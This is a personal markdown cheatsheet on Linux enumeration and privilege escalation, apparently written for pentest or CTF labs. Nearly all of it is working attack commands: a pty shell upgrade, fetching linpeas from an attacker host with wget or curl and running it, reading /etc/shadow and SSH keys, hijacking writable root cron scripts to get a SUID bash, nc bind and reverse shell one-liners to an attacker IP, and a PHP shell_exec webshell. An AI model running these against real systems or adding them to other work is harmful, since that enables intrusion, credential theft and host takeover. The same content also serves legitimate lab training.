#cheatsheet 
# Linux Enumeration & Privilege Escalation

## Upgrade Shell
1. `python -c 'import pty;pty.spawn("/bin/bash")'` - Spawns a python shell
2. `export TERM=xterm` - gives access to term commands such as clear
3. `stty raw -echo; fg` - turn off terminal echo (we can use arrow keys & autocomplete) and then foregrounds the shell

**Note:** If the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

### Change Terminal tty Size
1. *On attacker machine:*
`stty -a` - note down the values for column and rows

2. *On victim machine:*
`stty rows <value of rows>`
`stty cols <value of cols>`

## Linux Enumeration
### Using shell scripts (linpeas/linenum)
*Copy **linpeas.sh** from attacker machine to victim machine: *
1. *On attacker machine:*
`cd /path/to/linpeas`
`python3 -m http.server <port>`

2. *On victim machine:*
`wget http://<attacker-tun0-ip>:<port>/linpeas.sh -O /tmp/linpeas.sh`
OR
`curl http://<attacker-tun0-ip>:<port>/linpeas.sh -o /tmp/linpeas.sh`

3. *Change permissions to make it executable:*
`chmod +x linpeas.sh`

4. *Run linpeas.sh*
`./linpeas.sh`

**Note:** Linpeas does not find some important files such as a .txt file in /opt/ directory. It is recommended to manually visit all the directories in /.

### Manual
1. Run `sudo -l` to see what can be executed with root permissions

2. Important things to look out for:
- Binaries with SUID bit set
`find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null`

- Cronjobs run by root
`cat /etc/crontab`

- Readable /etc/shadow file
`cat /etc/shadow`

- /var/www/, /opt/, /usr/local/ (essentially all the directories in /)

- SSH keys
`ls -la /home/<user>/.ssh`

- Interesting files in /home/\<user\>

- Unusual directories or files in / dir
	
- .txt, .bak files
`locate txt` OR `find / -name *.txt`
`locate bak` OR `find / -name *.bak`

#### Cronjobs
If a bash file is user/world writeable and is run as root in a cronjob, the following could be a possible privesc method:
Add the relevant code to the user/world writeable file:
**Method 1**
1. Copy /bin/bash to /tmp and change permissions to enable SUID on the binary using 4755 permissions
2. Run the SUID binary to gain root shell
`/bin/bash -p`

**Method 2**
Listener For Bind Shell on Linux
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Listener For Reverse Shell
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Appropriately run *nc* command on the attacker machine based on the listener in the cron root executable file.*

___

If root password is available:
`su -` - then type password to gain shell

**Webshell**
Usually written in HTML forms or directly in browser (URL)
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

___
